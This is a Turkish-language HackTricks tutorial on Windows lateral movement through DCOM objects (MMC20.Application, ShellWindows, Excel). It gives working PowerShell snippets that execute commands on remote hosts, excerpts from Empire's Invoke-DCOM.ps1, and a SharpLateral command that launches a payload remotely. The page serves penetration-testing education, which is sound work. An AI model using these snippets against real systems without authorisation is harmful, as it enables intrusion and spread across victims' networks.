# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

## MMC20.Application

**Bu teknik hakkında daha fazla bilgi için orijinal gönderiyi [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/) kontrol edin.**

Dağıtılmış Bileşen Nesne Modeli (DCOM) nesneleri, nesnelerle ağ tabanlı etkileşimler için ilginç bir yetenek sunar. Microsoft, hem DCOM hem de Bileşen Nesne Modeli (COM) için kapsamlı belgeler sağlar; DCOM için [buradan](https://msdn.microsoft.com/en-us/library/cc226801.aspx) ve COM için [buradan](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>) erişilebilir. DCOM uygulamalarının bir listesi PowerShell komutu kullanılarak alınabilir:
```bash
Get-CimInstance Win32_DCOMApplication
```
COM nesnesi, [MMC Uygulama Sınıfı (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), MMC eklenti işlemlerinin betimlenmesini sağlar. Özellikle, bu nesne `Document.ActiveView` altında bir `ExecuteShellCommand` yöntemini içerir. Bu yöntem hakkında daha fazla bilgi [burada](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>) bulunabilir. Çalıştığını kontrol edin:

Bu özellik, bir DCOM uygulaması aracılığıyla bir ağ üzerinde komutların yürütülmesini kolaylaştırır. DCOM ile uzaktan admin olarak etkileşimde bulunmak için PowerShell aşağıdaki gibi kullanılabilir:
```powershell
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Bu komut DCOM uygulamasına bağlanır ve COM nesnesinin bir örneğini döndürür. ExecuteShellCommand yöntemi daha sonra uzak ana bilgisayarda bir işlemi yürütmek için çağrılabilir. İşlem aşağıdaki adımları içerir:

Yöntemleri kontrol et:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
RCE Elde Et:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com | Get-Member

# Then just run something like:

ls \\10.10.10.10\c$\Users
```
## ShellWindows & ShellBrowserWindow

**Bu teknik hakkında daha fazla bilgi için orijinal gönderiyi kontrol edin [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

**MMC20.Application** nesnesinin açık "LaunchPermissions" eksikliği olduğu tespit edildi ve bu, Yöneticilere erişim izni veren varsayılan izinlere geri dönmektedir. Daha fazla ayrıntı için bir konu [burada](https://twitter.com/tiraniddo/status/817532039771525120) incelenebilir ve açık Launch Permission olmayan nesneleri filtrelemek için [@tiraniddo](https://twitter.com/tiraniddo)’nun OleView .NET kullanımının önerildiği belirtilmiştir.

Açık Launch Permissions eksikliği nedeniyle iki özel nesne, `ShellBrowserWindow` ve `ShellWindows`, vurgulanmıştır. `HKCR:\AppID\{guid}` altında bir `LaunchPermission` kayıt girişi olmaması, açık izinlerin olmadığını gösterir.

### ShellWindows

ProgID'si olmayan `ShellWindows` için, .NET yöntemleri `Type.GetTypeFromCLSID` ve `Activator.CreateInstance`, AppID'sini kullanarak nesne oluşturmayı kolaylaştırır. Bu süreç, `ShellWindows` için CLSID'yi almak üzere OleView .NET'i kullanır. Oluşturulduktan sonra, `WindowsShell.Item` yöntemi aracılığıyla etkileşim mümkündür ve bu, `Document.Application.ShellExecute` gibi yöntem çağrılarına yol açar.

Nesneyi oluşturmak ve komutları uzaktan çalıştırmak için örnek PowerShell komutları sağlanmıştır:
```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### Lateral Movement with Excel DCOM Objects

Lateral hareket, DCOM Excel nesnelerini istismar ederek gerçekleştirilebilir. Ayrıntılı bilgi için, DCOM üzerinden lateral hareket için Excel DDE'yi kullanma konusundaki tartışmayı [Cybereason'un blogunda](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom) okumanız önerilir.

Empire projesi, DCOM nesnelerini manipüle ederek uzaktan kod yürütme (RCE) için Excel'in kullanımını gösteren bir PowerShell betiği sağlar. Aşağıda, RCE için Excel'i istismar etmenin farklı yöntemlerini sergileyen [Empire'ın GitHub deposundaki](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) betikten alıntılar bulunmaktadır:
```powershell
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
### Lateral Movement için Otomasyon Araçları

Bu teknikleri otomatikleştirmek için iki araç vurgulanmıştır:

- **Invoke-DCOM.ps1**: Uzak makinelerde kod çalıştırmak için farklı yöntemlerin çağrılmasını basitleştiren Empire projesi tarafından sağlanan bir PowerShell betiği. Bu betik, Empire GitHub deposunda mevcuttur.

- **SharpLateral**: Uzakta kod çalıştırmak için tasarlanmış bir araçtır ve şu komutla kullanılabilir:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Otomatik Araçlar

- Powershell betiği [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), diğer makinelerde kod çalıştırmanın tüm yorumlanan yollarını kolayca çağırmanıza olanak tanır.
- Ayrıca [**SharpLateral**](https://github.com/mertdas/SharpLateral) kullanabilirsiniz:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Referanslar

- [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

{{#include ../../banners/hacktricks-training.md}}
